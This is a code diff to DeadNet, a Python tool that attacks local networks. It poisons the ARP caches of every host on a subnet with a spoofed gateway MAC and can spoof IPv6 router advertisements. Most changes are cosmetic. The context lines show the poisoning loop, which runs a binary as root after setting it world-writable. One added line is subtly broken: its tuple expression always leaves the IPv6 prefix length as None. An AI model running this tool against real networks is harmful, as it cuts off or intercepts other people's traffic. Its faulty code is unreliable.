@@ -49,7 +49,7 @@ class DeadNet:
         self.loop_count = 0
 
         self.abort = str()
-        self.user_abort_reason = f"{RED}aborted by user{COLOR_RESET}"
+        self.user_abort_reason = f"{RED}stopped{COLOR_RESET}"
 
         self.arch_type = self._BINARY_MAP.get(pt.machine())
         if not self.arch_type:
@@ -67,7 +67,8 @@ class DeadNet:
             subprocess.run(f"chmod 777 {bin_path}", stdout=subprocess.PIPE, shell=True)
             subprocess.run(f"chown root {bin_path}", stdout=subprocess.PIPE, shell=True)
 
-        self.ipv6_prefix, self.ipv6_preflen = self.get_ipv6_data()
+        self.gateway_ipv6 = gateway_ipv6
+        self.ipv6_prefix, self.ipv6_preflen = self.get_ipv6_data() if self.gateway_ipv6 != "undefined" else None, None
         self.spoof_ipv6ra = self.ipv6_prefix and self.ipv6_preflen
 
         self.user_ipv4 = get_if_addr(self.network_interface)
@@ -80,7 +81,6 @@ class DeadNet:
         self.gateway_mac_fake = RandMAC()
         if not self.gateway_mac:
             raise Exception(f"Unable to get gateway MAC address")
-        self.gateway_ipv6 = gateway_ipv6
 
         self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
                            str(host_ip) != self.user_ipv4 and str(host_ip) != self.gateway_ipv4]
@@ -94,6 +94,7 @@ class DeadNet:
             self.intro += f"Dead router attack (IPv6) - {RED}disabled{COLOR_RESET}\n\n"
 
         self.intro += f"ARP poisoning (IPv4) - {GREEN}enabled{COLOR_RESET}\n"
+        self.intro += f"IPv4 subnet range - {self.subnet_ipv4_sr}\n\n"
 
     def get_ipv6_data(self):
         prefix, preflen = str(), int()
@@ -119,7 +120,7 @@ class DeadNet:
         * poison every possible host with a spoofed mac address for the gateway
         """
         ra_step_count = 0
-        for host_ip in self.host_ipv4s:
+        for idx, host_ip in enumerate(self.host_ipv4s):
             if self.abort:
                 return
             if self.spoof_ipv6ra:
@@ -133,7 +134,8 @@ class DeadNet:
             subprocess.Popen(
                 f"su -c {self.arp_path} {self.gateway_ipv4} {self.gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff {self.my_mac}",
                 shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            self.print_mtd(f"{self.intro}poisoning {host_ip} cycle #{str(self.loop_count)}")
+            self.print_mtd(f"{self.intro}running... cycle #{self.loop_count}"
+                           f" [{((int(1 + idx * 10 / 255)) * '-').ljust(10)}]")
 
     def poison_ra(self):
         """
@@ -156,4 +158,4 @@ class DeadNet:
         if self.abort != self.user_abort_reason:
             self.print_mtd(f"{self.abort}", True)
         else:
-            self.print_mtd(f"{self.intro}\n{self.abort}")
+            self.print_mtd(f"{self.intro}{self.abort}")
